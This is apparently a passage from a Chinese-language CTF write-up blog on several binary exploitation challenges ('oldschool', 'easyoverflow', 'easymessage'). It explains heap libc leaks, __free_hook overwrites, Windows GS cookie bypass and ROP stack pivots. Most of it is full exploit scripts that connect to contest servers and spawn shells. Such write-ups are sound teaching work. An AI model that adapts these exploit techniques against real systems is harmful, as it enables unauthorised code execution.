class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">opendir</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readdir</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">-8</span>, <span class="number">8</span>, p64(<span class="number">0x4E1</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">-0x7F88</span>, <span class="number">0x28</span>, p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xB8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, <span class="number">-0x7FA8</span> + <span class="number">3</span>, <span class="number">5</span>, <span class="string">'AAAAA'</span>)</span><br><span class="line">readdir()</span><br><span class="line">readdir()</span><br><span class="line">readdir()</span><br><span class="line">p.recvuntil(<span class="string">"AAAAA"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">-0x100</span>, <span class="number">8</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">11</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">12</span>, <span class="number">0</span>, <span class="number">8</span>, p64(libc_system))</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h1><p>这题当时是队里大佬们做的，我只是赛后又做了一遍。</p><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>题目给的是源代码，编译方式<code>Ubuntu 18.04, GCC -m32 -O3</code>，直接看源码会发现没有问题，之前pwnable以及中科大的HackerGame上也有过直接给源码的，反倒是编译后洞更明显。</p></li><li><p>那么直接编译之后，就会发现，<code>mmap_edit</code>有逻辑被优化掉了：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="number">4</span> * v2 &gt;= <span class="number">0</span> || (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(g_ptr + <span class="number">4</span> * v2) &gt; <span class="number">0xEFFFFFFF</span> )</span><br><span class="line">&#123;</span><br><span class="line">  __printf_chk(<span class="number">1</span>, <span class="string">"Value: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%u"</span>, &amp;v3) != <span class="number">1</span> )</span><br><span class="line">LABEL_3:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  *(_DWORD *)(g_ptr + <span class="number">4</span> * v0) = v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 也就是说check不存在了，可以直接写到高地址的libc处了。</p></li><li><p>那么首先填满tcache，然后拿到unsorted bin，利用unsorted bin来leak出libc地址。</p></li><li><p>之后及直接利用<code>mmap_edit</code>写<code>__free_hook</code>为<code>system</code>即可。</p></li><li><p>exp:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'106.14.214.3'</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mmap</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"6"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Where do you want to start: "</span>, str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_map</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"7"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Value: "</span>, str(val))</span><br><span class="line"></span><br><span class="line">main_arean_offset = <span class="number">0x1d87a0</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"AAA\n"</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x38</span> - main_arean_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">mmap(<span class="number">0</span>)</span><br><span class="line">offset = (__free_hook - <span class="number">0xE0000000</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">edit_map(offset, str(libc_system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easyoverflow"><a href="#easyoverflow" class="headerlink" title="easyoverflow"></a>easyoverflow</h1><p>比较简单的一个windows栈溢出，正好最近在学。</p><h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先栈溢出比较明显：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  --v10;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;Dst, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;Dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 &gt; <span class="number">0</span> );</span><br></pre></td></tr></table></figure><p> 也可以看出<code>SEH</code>和<code>SafeSEH</code>都没有，开了<code>GS</code>。</p></li><li><p>其次由于windows的ASLR机制与linux下不同，PIE base和dll base其低2 bytes均为0，而且在短时间内是不会变化的，也就是说第一次leak出来之后，后面可以直接用而不会因连接重置而重置；但是栈地址依然是随机的。</p></li><li><p>那么先统一把栈上面已有的<code>PIE</code>和<code>ntdll</code>上的库函数地址给leak出来，<code>PIE</code>用来return到<code>puts</code>上进行leak，（因为<code>puts</code>函数并不在<code>ntdll</code>里面，而<code>system</code>函数在<code>ucrtbase.dll</code>里面）。</p></li><li><p>至于这个栈上的<code>cookie</code>，从汇编代码中也可以看见：</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF61C651000                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651002                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">130h</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651009                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:__security_cookie</span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651010                 <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651013                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">138h</span>+var_18], <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510B2                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rsp</span>+<span class="number">138h</span>+var_18]</span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510BA                 <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">rsp</span>        <span class="comment">; StackCookie</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510BD                 <span class="keyword">call</span>    __security_check_cookie</span><br></pre></td></tr></table></figure><p> 是先从binary的位置拿出<code>__security_cookie</code>的值，然后和<code>rsp</code>进行异或再写入栈上，退出时同样拿出栈上的<code>cookie</code>与<code>rsp</code>进行异或后再进行和<code>__security_cookie</code>的比较。因此如果<code>rsp</code>发生了变化，不能单纯地使用<code>cookie</code>来填充，而要leak出<code>__security_cookie</code>和<code>cookie</code>计算出<code>rsp</code>地值，再用<code>__security_cookie</code>和新的<code>rsp</code>异或得到新的<code>cookie</code>写入到栈上。</p></li><li><p>后续地就是利用<code>puts</code>将<code>read</code>地地址leak出来，然后计算出<code>ucrtbase</code>的加载地址从而计算出<code>system</code>和<code>cmd.exe</code>的地址，再用rop执行<code>system(&quot;cmd.txt&quot;)</code>，getshell后利用<code>type flag.txt</code>读flag。</p></li><li><p>exp（写得比较复杂，实际那些base地址在leak之后都可以直接用）：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./StackOverflow.exe")</span></span><br><span class="line"><span class="comment"># if len(sys.argv) == 2 and sys.argv[1] == '1':</span></span><br><span class="line"><span class="comment">#     windbgx.attach(p)</span></span><br><span class="line">    </span><br><span class="line">p = remote(<span class="string">'39.99.46.209'</span>, <span class="number">13389</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi = <span class="number">0x000000000000cf23</span> <span class="comment"># pop rdi ; pop rsi ; ret</span></span><br><span class="line">pop_rcx = <span class="number">0x000000000009217b</span> <span class="comment"># pop rcx ; ret</span></span><br><span class="line">puts_gadget = <span class="number">0x10A6</span></span><br><span class="line">GS_offset = <span class="number">0x3008</span></span><br><span class="line">read_offset = <span class="number">0x2178</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recv(<span class="number">0x100</span>)</span><br><span class="line">cookie = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "A" * 0x118</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># p.recvuntil("buffer:")</span></span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"><span class="comment"># p.recv(0x118)</span></span><br><span class="line"><span class="comment"># PIE_base = u64(p.recv(6).ljust(8, '\x00')) - 0x12F4</span></span><br><span class="line"><span class="comment"># PIE_base =  0x7ff61c650000</span></span><br><span class="line">PIE_base =  <span class="number">0x7ff6fcba0000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x188</span></span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recv(<span class="number">0x188</span>)</span><br><span class="line">ntdll_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x6A271</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(cookie)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(PIE_base + GS_offset)</span><br><span class="line">payload += p64(PIE_base + puts_gadget)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\r\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">GS = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">old_rsp = GS ^ cookie</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x130</span> + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(GS ^ new_rsp)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(PIE_base + read_offset)</span><br><span class="line">payload += p64(PIE_base + puts_gadget)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x16270</span></span><br><span class="line">system = ucrtbase_base + <span class="number">0xABBA0</span></span><br><span class="line">cmd_exe = ucrtbase_base + <span class="number">0xCC9F0</span></span><br><span class="line"></span><br><span class="line">new_rsp += <span class="number">0x130</span> + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(GS ^ new_rsp)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(cmd_exe)</span><br><span class="line">payload += p64(ntdll_base + pop_rdi_rsi) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] cookie: %s"</span> % hex(cookie))</span><br><span class="line">print(<span class="string">"[*] PIE_base: %s"</span> % hex(PIE_base))</span><br><span class="line">print(<span class="string">"[*] ntdll_base: %s"</span> % hex(ntdll_base))</span><br><span class="line">print(<span class="string">"[*] GS: %s"</span> % hex(GS))</span><br><span class="line">print(<span class="string">"[*] ucrtbase_base: %s"</span> % hex(ucrtbase_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easymessage"><a href="#easymessage" class="headerlink" title="easymessage"></a>easymessage</h1><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>最开始的时候<code>Leave message</code>可以溢出<code>8 bytes</code>覆盖<code>rbp</code>，先输入<code>name</code>为一个大于<code>256</code>的值，然后利用溢出控制<code>rbp - 4</code>指向<code>bss</code>上<code>name</code>的内存区域：</p> <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400985</span>                 <span class="keyword">cmp</span>     [<span class="built_in">rbp</span>+var_4], <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040098C                 <span class="keyword">jle</span>     short loc_400995</span><br><span class="line"><span class="symbol">.text:</span>000000000040098E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4], <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span> loc_400995:                             <span class="comment">; CODE XREF: work+72↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400998</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040099A                 <span class="keyword">call</span>    leave_message</span><br></pre></td></tr></table></figure></li><li><p>第二次<code>Leave message</code>就可以输入<code>0x100</code>的<code>payload</code>，直接写入<code>write</code>的gadgets来leak libc ，以及<code>read</code>的gadget来向<code>bss</code>上读入第二段<code>rop</code>，同时stack pivot到写入第二段<code>rop</code>的位置处</p></li><li><p>之后写入 system(“/bin/sh”) 的 gadget 即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">21342</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">'message: '</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'says: '</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">'write'</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400646</span> <span class="comment"># ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400ac3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400ac1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400886</span> <span class="comment"># leave ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x400AA0</span></span><br><span class="line">gadget_2 = <span class="number">0x400AB6</span></span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">leave_name(<span class="string">"\x70"</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>)</span><br><span class="line">leave_message(payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0</span>)</span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">0x8</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">0x200</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, 